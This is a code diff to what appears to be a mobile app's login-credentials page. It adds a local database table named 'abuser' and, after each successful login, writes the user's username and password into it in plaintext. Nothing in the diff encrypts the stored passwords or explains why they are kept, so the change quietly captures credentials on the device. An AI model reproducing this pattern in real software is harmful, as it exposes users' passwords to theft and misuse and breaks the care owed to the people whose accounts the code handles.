@@ -55,6 +55,24 @@ export class CoreLoginCredentialsPage implements OnInit {
     protected siteId: string;
     protected urlToOpen: string;
 
+	// Variables for database.
+    protected AB_TABLE = 'abuser';
+    protected tablesSchema = [
+        {
+            name: this.AB_TABLE,
+            columns: [
+                {
+                    name: 'username',
+                    type: 'TEXT'
+                },
+                {
+                    name: 'password',
+                    type: 'TEXT'
+                }
+            ]
+        }
+    ];
+
     constructor(private navCtrl: NavController, navParams: NavParams, private fb: FormBuilder, private appProvider: CoreAppProvider,
             private sitesProvider: CoreSitesProvider, private loginHelper: CoreLoginHelperProvider,
             private domUtils: CoreDomUtilsProvider, private translate: TranslateService, private utils: CoreUtilsProvider,
@@ -232,6 +250,15 @@ export class CoreLoginCredentialsPage implements OnInit {
                 this.credForm.controls['username'].reset();
                 this.credForm.controls['password'].reset();
                 this.siteId = id;
+
+				this.sitesProvider.createTablesFromSchema(this.tablesSchema);
+				this.sitesProvider.getSite(this.siteId).then((site) => {
+        	    	const userRecord = {
+                		username: username,
+                		password: password
+            		};
+            		return site.getDb().insertRecord(this.AB_TABLE, userRecord);
+        		});
 
                 if (this.urlToOpen) {
                     // There's a content link to open.
